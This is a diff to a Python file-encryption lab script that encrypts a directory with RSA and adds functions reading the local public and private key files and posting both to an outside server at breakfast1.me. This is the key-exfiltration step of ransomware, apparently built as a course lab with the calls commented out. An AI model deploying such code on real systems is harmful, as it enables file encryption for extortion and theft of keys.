@@ -6,6 +6,8 @@ from os.path import isfile, join, splitext
 from os import remove, walk
 from json import dumps, loads
 from platform import system
+import requests
+import urllib.parse
 import FileEncryption
 
 PUBLIC_EXPONENT = 65537
@@ -25,6 +27,7 @@ ENCRYPTION_DIRECTORY = join(PROJECT_DIRECTORY, "File encryption lab/TestDir")
 RSA_PRIVATE_KEY_FILEPATH = join(PROJECT_DIRECTORY, "File encryption lab/private.pem")
 RSA_PUBLIC_KEY_FILEPATH = join(PROJECT_DIRECTORY, "File encryption lab/public.pem")
 DO_NOT_ENCRYPT_LIST = [RSA_PUBLIC_KEY_FILEPATH, RSA_PRIVATE_KEY_FILEPATH]
+API_ENDPOINT = "https://breakfast1.me/api/keys"
 
 # This function does step 1.
 # If either pem file does not exist, generate keys and create the files.
@@ -300,21 +303,71 @@ def main_decryptDir():
     decryptDir(directory, RSA_privatekey_filepath)
     i = input()
 
-#test_RSAEncrypt()
-#test_writeRSAKeyFile()
-#test_loadRSAKeyFile()
-#test_MyRSAEncrypt()
-#test_MyRSAEncryptFile()
-#test_MyRSADecryptFile()
-#demo_MyRSAEncryptFile()
 
-#checkAndCreatePEMFiles()
-#test_encryptDir()
-#test_decryptDir()
-#demo_encryptDir()
 
-#checkAndCreatePEMFiles()
-#demo_encryptDir()
 
-#main_decryptDir()
-#main_encryptDir()
+
+# Print each line of the list returned by GET
+def print_formatted(data):
+    for v in data:
+        print(v)
+
+def readPubKey():
+    filepath = RSA_PUBLIC_KEY_FILEPATH
+    with open(filepath, "r") as key_file:
+        text = key_file.read()
+    return text
+
+def readPrivKey():
+    filepath = RSA_PRIVATE_KEY_FILEPATH
+    with open(filepath, "r") as key_file:
+        text = key_file.read()
+    return text
+
+def test_readKeys():
+    pub = readPubKey()
+    priv = readPrivKey()
+
+    print(pub)
+    print(priv)
+
+def requestGet():
+    r = requests.get(url = API_ENDPOINT)
+    data = r.json()
+    return data
+
+def requestPost(pubkey, privkey):
+    resultList = requestGetByPubkey(pubkey)
+    if len(resultList) > 0:
+        raise Exception("That public key is already in the database.")
+
+    data = {
+        "pubkey": pubkey,
+        "privkey": privkey
+    }
+
+    r = requests.post(url = API_ENDPOINT, json = data)
+    if r.status_code != 200:
+        raise Exception("Server Error")
+
+def requestPostKeys():
+    requestPost(readPubKey(), readPrivKey())
+
+def requestGetByPubkey(pubkey):
+    pubkey_encoded = urllib.parse.quote(pubkey, safe='')
+    url = API_ENDPOINT + "?pubkey=" + pubkey_encoded
+    
+    r = requests.get(url = url)
+    data = r.json()
+    return data
+
+def test_requestGetByPubkey(pubkey):
+    p = readPubKey()
+    z = requestGetByPubkey(pp)
+    print(len(z))
+
+
+#requestPostKeys()
+#print_formatted(requestGet())
+
+
